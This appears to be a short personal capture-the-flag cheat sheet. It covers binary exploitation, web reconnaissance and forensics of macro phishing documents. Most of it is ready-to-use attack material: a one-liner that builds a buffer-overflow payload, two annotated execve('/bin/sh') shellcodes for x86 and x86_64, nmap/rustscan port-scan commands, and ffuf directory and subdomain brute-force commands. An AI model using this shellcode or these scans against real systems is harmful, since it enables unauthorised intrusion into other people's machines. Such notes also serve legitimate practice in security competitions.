# pwn

```
python3 -c 'import sys;sys.stdout.buffer.write(b"i"*64 + b"\xff")'
```

(linux/x86) execve("/bin/sh",0,0); 21 bytes
```
"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

    "\x31\xc9"                  // xor    %ecx,%ecx
    "\xf7\xe1"                  // mul    %ecx
    "\x51"                      // push   %ecx
    "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
    "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
    "\x89\xe3"                  // mov    %esp,%ebx
    "\xb0\x0b"                  // mov    $0xb,%al
    "\xcd\x80"                  // int    $0x80
```

(linux/x86_64) execve("/bin/sh"); 30 bytes
```
"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
    "\x53"                                          // push   %rbx
    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
    "\x50"                                          // push   %rax
    "\x57"                                          // push   %rdi
    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
    "\xb0\x3b"                                      // mov    $0x3b, %al
    "\x0f\x05";                                     // syscall
```

# web

## portscan
```
sudo rustscan -a $IP --ulimit 8192 -- -sC -sV -o nmap
sudo nmap -sC -sV -v -p- -o nmap $IP
```

## web bruteforce
```
ffuf -w /usr/share/wordlists/directory-list-2.3-small.txt:FUZZ -u http://RHOST:RPORT/FUZZ -recursion -recursion-depth 2 -e '.php,.txt,.html' -t 128 -v
ffuf -w /usr/share/wordlists/directory-list-2.3-big.txt:FUZZ -u http://RHOST:RPORT/FUZZ -recursion -recursion-depth 2 -t 128 -v
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://RHOST:RPORT/ -H 'Host: FUZZ.DOMAIN' -t 128 -v
```

# forenshit

## office macro phishing

```
olevba FILE
```

SCRIPT.vbs

powershell decodes to 16 bits not 8
